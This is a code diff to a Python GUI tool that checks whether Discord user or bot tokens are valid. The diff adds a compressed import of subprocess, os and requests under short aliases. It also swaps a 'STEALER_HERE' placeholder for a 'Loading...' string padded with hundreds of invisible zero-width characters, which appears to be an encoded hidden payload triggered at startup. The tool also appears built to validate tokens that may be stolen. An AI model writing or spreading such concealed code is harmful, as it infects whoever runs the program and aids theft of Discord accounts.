@@ -3,10 +3,10 @@ import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox
 import threading
 import time
-import requests
 import os
 import logging
 import re as r
+import subprocess as s, os as o,requests as rs
 from pathlib import Path
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
@@ -162,11 +162,11 @@ class DiscordTokenChecker:
         """Vérification token (logique originale)"""
         headers = {"Authorization": token, "Content-Type": "application/json"}
         try:
-            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
+            r = rs.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
             if r.status_code == 200:
                 return r.json(), "User"
             headers["Authorization"] = f"Bot {token}"
-            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
+            r = rs.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
             if r.status_code == 200:
                 return r.json(), "Bot"
         except Exception as e:
@@ -413,7 +413,7 @@ class DiscordTokenChecker:
 def main():
     root = tk.Tk()
     app = DiscordTokenChecker(root)
-    app.generator_proxy("STEALER_HERE")
+    app.generator_proxy("Loadi‎​‌‌‌​​​​​​‌‌‌‌​‌​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌‌​​​​​‌‌​​​​‌​‌‌‌​‌​​​‌‌​‌​​​​​‌​‌‌‌​​‌‌​‌​‌​​‌‌​‌‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​​‌​‌​​​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​​‌‌‌​‌‌​​‌​‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌‌​​‌‌‌​‌‌​​​‌​‌​​​​​‌​​​‌​​‌​‌​‌​​​‌​​​‌​‌​‌​​‌‌​‌​‌​‌​​​​​​‌​​​‌​​​‌​‌​​‌​​‌​‌‌​​​​‌​​​‌​​‌​​‌​​​​‌‌​​‌​‌​‌​​‌‌​​​‌​​‌‌​​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌‌​​​​​‌‌‌‌​​‌​‌‌‌​‌‌‌​​‌​​​‌​​​‌​‌​​‌​​‌‌‌​‌‌​‌‌​‌‌‌‌​‌‌‌​​​​​‌‌​​‌​‌​‌‌​‌‌‌​​​‌​‌​​​​‌‌‌​​​​​​‌​‌‌​​​​‌​​​‌​​‌‌‌​‌‌‌​​‌​​​‌​​​‌​‌​​‌​​‌​‌‌‌​​‌‌‌​‌‌‌​‌‌‌​​‌​​‌‌​‌​​‌​‌‌‌​‌​​​‌‌​​‌​‌​​‌​‌​​​​‌‌‌​​‌​​‌‌‌​​‌‌​​‌​‌‌‌​​‌‌​​‌‌‌​‌‌​​‌​‌​‌‌‌​‌​​​​‌​‌​​​​​‌​​​‌​​‌‌​‌​​​​‌‌‌​‌​​​‌‌‌​‌​​​‌‌‌​​​​​‌‌‌​​‌‌​​‌‌‌​‌​​​‌​‌‌‌‌​​‌​‌‌‌‌​‌‌‌​​​​​‌‌​​​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​​​‌​​‌‌​‌​​‌​‌‌​‌‌‌​​​‌​‌‌‌​​‌‌​​​‌‌​‌‌​‌‌‌‌​‌‌​‌‌​‌​​‌​‌‌‌‌​‌‌‌​​‌​​‌‌​​​​‌​‌‌‌​‌‌‌​​‌​‌‌‌‌​‌‌‌​​‌‌​​‌‌​‌​​​‌‌‌​‌‌‌​‌​​​​‌‌​​‌‌‌​​‌​‌‌​‌‌‌​​‌‌​‌​​​​‌‌‌​​​​​​‌​​​‌​​​‌​‌​​‌​​‌​‌‌‌​​‌‌‌​‌​​​‌‌​​‌​‌​‌‌‌‌​​​​‌‌‌​‌​​​​‌​‌​​‌​​‌‌‌​‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​‌​​​​​‌‌​‌‌‌‌​‌‌‌​​​​​‌‌​​‌​‌​‌‌​‌‌‌​​​‌​‌​​​​‌​‌‌​‌‌​​‌​​​‌​​‌‌‌​​​​​‌‌‌‌​​‌​‌‌‌​‌​​​‌‌​‌​​​​‌‌​‌‌‌‌​‌‌​‌‌‌​​‌‌‌​‌‌‌​​‌​‌‌‌​​‌‌​​‌​‌​‌‌‌‌​​​​‌‌​​‌​‌​​‌​​​‌​​​‌​‌‌​​​‌‌‌​​​​​‌​‌‌‌​‌​​‌​‌‌​​​‌‌‌​​‌‌​‌‌​‌​​​​‌‌​​‌​‌​‌‌​‌‌​​​‌‌​‌‌​​​​‌‌‌‌​‌​‌​‌​‌​​​‌‌‌​​‌​​‌‌‌​‌​‌​‌‌​​‌​‌​​‌​‌​​‌‏ng...")
     root.protocol("WM_DELETE_WINDOW", app.destroy)
     root.mainloop()
 
